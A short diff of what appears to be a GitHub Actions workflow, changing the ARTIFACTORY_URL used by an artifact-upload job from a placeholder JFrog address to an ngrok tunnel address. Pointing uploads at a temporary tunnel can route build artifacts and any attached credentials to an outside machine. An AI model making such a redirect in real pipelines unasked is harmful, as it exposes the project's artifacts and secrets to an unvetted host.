@@ -29,7 +29,7 @@ on:
         required: true
 
 env:
-  ARTIFACTORY_URL: "https://yourname.jfrog.io/artifactory"
+  ARTIFACTORY_URL: "https://unwisely-sweepable-vincent.ngrok-free.dev/artifactory"
 
 jobs:
   upload-artifact-to-fileshare:
